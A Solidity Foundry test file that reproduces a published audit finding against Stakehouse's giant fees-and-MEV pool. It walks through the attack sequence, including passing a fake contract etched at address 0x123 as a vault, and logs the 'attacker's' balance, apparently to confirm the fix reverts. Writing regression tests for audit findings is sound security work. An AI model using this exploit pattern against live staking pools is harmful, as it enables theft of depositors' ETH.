pragma solidity ^0.8.13;

// SPDX-License-Identifier: MIT

import "forge-std/console.sol";

import {GiantPoolTests} from "./GiantPools.t.sol";

import { LPToken } from "../../../contracts/liquid-staking/LPToken.sol";

contract TakeFromGiantPools is GiantPoolTests {

    // https://code4rena.com/reports/2022-11-stakehouse/#h-10-giantmevandfeespoolbringunusedethbackintogiantpool-function-loses-the-addition-of-the-idleeth-which-allows-attackers-to-steal-most-of-eth-from-the-giant-pool
    function testDWclaimRewards() public {
        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);
        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);
        address feesAndMevUserTwo = accountThree; vm.deal(feesAndMevUserTwo, 4 ether);

        // Register BLS key
        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);

        // Deposit ETH into giant fees and mev
        vm.startPrank(feesAndMevUserOne);
        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);
        vm.stopPrank();
        vm.startPrank(feesAndMevUserTwo);
        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);
        bytes[][] memory blsKeysForVaults = new bytes[][](1);
        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);
        uint256[][] memory stakeAmountsForVaults = new uint256[][](1);
        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);
        giantFeesAndMevPool.batchDepositETHForStaking(
            getAddressArrayFromValues(address(manager.stakingFundsVault())),
            getUint256ArrayFromValues(4 ether),
            blsKeysForVaults,
            stakeAmountsForVaults
        );
        vm.warp(block.timestamp+31 minutes);
        LPToken[] memory tokens = new LPToken[](1);
        tokens[0] = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);
        LPToken[][] memory allTokens = new LPToken[][](1);
        allTokens[0] = tokens;
        giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(
            getAddressArrayFromValues(address(manager.stakingFundsVault())),
            allTokens,
            stakeAmountsForVaults
        );
        // inject a NOOP to skip some functions
        address[] memory stakingFundsVaults = new address[](1);
        bytes memory code = new bytes(1);
        code[0] = 0x00;
        vm.etch(address(0x123), code);
        stakingFundsVaults[0] = address(0x123);
        vm.expectRevert(bytes4(keccak256("NoDerivativesMinted()")));
        giantFeesAndMevPool.claimRewards(feesAndMevUserTwo, stakingFundsVaults, blsKeysForVaults);
        vm.stopPrank();
        console.log("user one:", getBalance(feesAndMevUserOne));
        console.log("user two(attacker):", getBalance(feesAndMevUserTwo));
        console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));
    }
    function getBalance(address addr) internal returns (uint){
        // giant LP : eth at ratio of 1:1
        return addr.balance + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);
    }
}